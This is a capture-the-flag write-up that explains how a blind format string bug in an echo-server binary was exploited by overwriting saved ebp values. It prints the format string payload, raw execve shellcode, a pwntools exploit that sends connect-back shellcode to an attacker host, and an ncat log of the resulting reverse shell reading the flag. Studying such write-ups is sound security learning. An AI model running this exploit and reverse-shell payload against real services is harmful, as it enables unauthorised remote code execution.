### Solved by superkojiman and et0x

superkojiman here; this pwnable challenge was essentially an echo server. Anything we sent to it was sent right back to us. The code was really simple, and there was no NX on the binary which meant we could execute shellcode on the stack. et0x and I quickly found that it was vulnerable to a format string attack when snprintf() was called in the make_response() function:

```
# ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAA.b76bac1a.b77b9440.804a080.bf9e52f8.804852c.1.0.804a080.b77b8ff4.0.0.bf9e5318.8048557.804a080.400.b77b9440
```

However, we found that our format string wasn't on the stack. After doing a bit of searching online, I found an article on blind format string attacks [here](https://www.sec.in.tum.de/assets/Uploads/formatstring.pdf). It specifically talked about modifying ebp such that it ended up redirecting to a memory location of our choosing. Since the challenge was called ebp, I knew I was on the right track. 

Although our format string wasn't on the stack, ebp for make_response() and echo() were! make_response()'s ebp was at offset 4, and echo()'s was at offset 6. By modifying make_response()'s ebp, we could modify main()'s ebp as well so that when main() returned, it would return to our shellcode. A good place to store our shellcode was at buf, which had a static address of 0x0804a080. 

Within minutes et0x had figured out the correct number of bytes to write so that main()'s ebp would be overwritten with 0x0804a080. My initial payload looked like this:

```python
payload = ""
payload += "%134520975u%4$n"
payload +=  buf_addr
payload += "BBBB"
payload += "AAAA" 
payload += "jhh///sh/bin\x89\xe31\xc9j\x0bX\x99\xcd\x80"
```

Sending this payload caused main() to return to 0x42424242, so we successfully gained control of execution. I calculated the offset of the start of the shellcode in the payload and replaced "BBBB" with that address. Here's the final exploit: 

```python
#!/usr/bin/env python
from pwn import *

r = remote("52.6.64.173", 4545)

buf_addr = p32(0x0804a080)
sc_addr  = p32(0x0804A09b)

payload =  "" 
payload += "%134520975u%4$n"
payload += buf_addr
payload += sc_addr
payload += "AAAA"

payload += asm(shellcraft.linux.connect("x.x.x.x", 9898))
payload += asm(shellcraft.linux.dupsh())

print "+ sending payload"
r.send(payload + "\n")
print "+ got back:", r.recv()
```

It took a while for the exploit to work on the server, but when it finally did, I got a reverse shell to the server and was able to grab the flag: 

```text
root@vps123456:~# ncat -lvp 9898
Ncat: Version 6.00 ( http://nmap.org/ncat )
Ncat: Listening on :::9898
Ncat: Listening on 0.0.0.0:9898
Ncat: Connection from 52.6.64.173.
Ncat: Connection from 52.6.64.173:51340.
id
uid=1001(problem) gid=1001(problem) groups=1001(problem)
ls /home/problem
ebp
flag.txt
cat /home/problem/flag.txt
who_needs_stack_control_anyway?
```

The flag was **flag{who_needs_stack_control_anyway?}**
